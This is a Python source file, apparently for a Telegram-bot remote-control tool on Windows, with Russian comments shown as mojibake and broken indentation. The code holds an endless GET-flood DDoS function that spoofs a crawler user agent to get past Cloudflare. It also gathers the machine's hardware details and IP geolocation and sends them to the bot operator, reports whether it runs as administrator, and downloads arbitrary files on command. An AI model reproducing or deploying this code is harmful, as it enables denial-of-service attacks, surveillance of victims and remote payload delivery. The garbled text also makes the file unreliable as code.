# -*- coding: utf8 -*-
import os
import platform
import subprocess
import threading
import requests
import pyautogui
import keyboard
import telebot
import json as jsn
import datetime
import argparse
import ctypes
import platform

    def ddos(bot, white_list_id, url):
        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º headers Google –±–æ—Ç–∞, –¥–ª—è –æ–±—Ö–æ–¥–∞ Cloudflare
        headers = {"User-Agent": "Google Bot"}

        if 'http' in url and '.' in url:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –Ω–∞—á–∞–ª–µ DDOS –∞—Ç–∞–∫–∏
            bot.send_message(white_list_id, f'DDOS –∞—Ç–∞–∫–∞ –Ω–∞ {url} —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω–∞')
        else:
            bot.send_message(white_list_id, f'–û—à–∏–±–∫–∞: –Ω–µ–≤–µ—Ä–Ω—ã–π url, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å –≤–≤–µ–¥–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö')

        while True:
            try:
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º GET –∑–∞–ø—Ä–æ—Å —Å –¥–∞–Ω–Ω—ã–º–∏
                requests.get(url, headers=headers, allow_redirects=True, stream=True)
            except Exception:
                pass

    def specifications(self, white_list_id, bot):
        """
        –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏–π –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
        """
        list_vid = os.popen(r"wmic path win32_VideoController get name").read().split('\n')[2].strip()
        ram = os.popen(r"wmic OS get FreePhysicalMemory").read().split("\n")[2].strip() + " MB"
        x, y = pyautogui.size()
        banner = f"""–ò–º—è –ü–ö:   {platform.node()}\n
        –û–°: {platform.system()} {platform.release()}\n
        –†–∞–∑—Ä—è–¥–Ω–æ—Å—Ç—å: {platform.architecture()[0]}\n
        CPU: {platform.processor()}\n
        GPU: {list_vid}\n
        RAM: {ram}\n
        –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: {x}x{y}"""
        bot.send_message(white_list_id, banner)

    def ip_address(white_list_id, bot):
        """
        –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± IP-–∞–¥—Ä–µ—Å–µ
        """
        try:
            # –ü–æ–ª—É—á–µ–Ω–∏–µ IP-–∞–¥—Ä–µ—Å–∞ —á–µ—Ä–µ–∑ jsonip.com
            ip = requests.get("http://jsonip.com/").json()
            # –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± IP-–∞–¥—Ä–µ—Å–µ —á–µ—Ä–µ–∑ ip-api.com
            response = requests.get(url=f'http://ip-api.com/json/{ip["ip"]}').json()

            # –°–æ–∑–¥–∞–Ω–∏–µ —Å–ª–æ–≤–∞—Ä—è —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ–± IP-–∞–¥—Ä–µ—Å–µ
            data = {
                '[IP]': response.get('query'),
                '[–ü—Ä–æ–≤–∞–π–¥–µ—Ä]': response.get('isp'),
                '[–û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è]': response.get('org'),
                '[–°—Ç—Ä–∞–Ω–∞]': response.get('country'),
                '[–†–µ–≥–∏–æ–Ω]': response.get('regionName'),
                '[–ì–æ—Ä–æ–¥]': response.get('city'),
                '[ZIP]': response.get('zip'),
                '[–®–∏—Ä–æ—Ç–∞]': response.get('lat'),
                '[–î–æ–ª–≥–æ—Ç–∞]': response.get('lon'),
            }

            # –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç—Ä–æ–∫–∏ —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ–± IP-–∞–¥—Ä–µ—Å–µ
            info_string = ""
            for k, v in data.items():
                info_string += f'{k} : {v}\n'

            # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å—Ç—Ä–æ–∫–∏ —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ–± IP-–∞–¥—Ä–µ—Å–µ
            bot.send_message(white_list_id, info_string)
        except requests.exceptions.ConnectionError:
            bot.send_message(white_list_id, '–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è')

    def wgt(white_list_id, text_comand, bot):
        """
        –ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞ —Å —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ URL
        """
        try:
            # –ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞ —Å —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ URL —á–µ—Ä–µ–∑ –±–∏–±–ª–∏–æ—Ç–µ–∫—É requests
            file = requests.get(text_comand[0])
            # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ –≤ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –º–µ—Å—Ç–æ
            with open(text_comand[1], 'wb') as f:
                f.write(file.content)
            bot.send_message(white_list_id, "üñ•‚úÖ")
        except Exception:
            bot.send_message(white_list_id, '–û—à–∏–±–∫–∞')

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


class Func_API:
    def __init__(self) -> None:
        for ids in white_list_id:
            try:
                if is_admin():
                    bot.send_message(ids, f'{name_pc} –∑–∞–ø—É—â–µ–Ω –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞')
                else:
                    bot.send_message(ids, f'{name_pc} –∑–∞–ø—É—â–µ–Ω –æ—Ç –∏–º–µ–Ω–∏ –æ–±—ã—á–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è')
            except Exception:
                pyautogui.alert("–í—ã —É–∫–∞–∑–∞–ª–∏ –Ω–µ–≤–µ—Ä–Ω—ã–π —Ç–æ–∫–µ–Ω")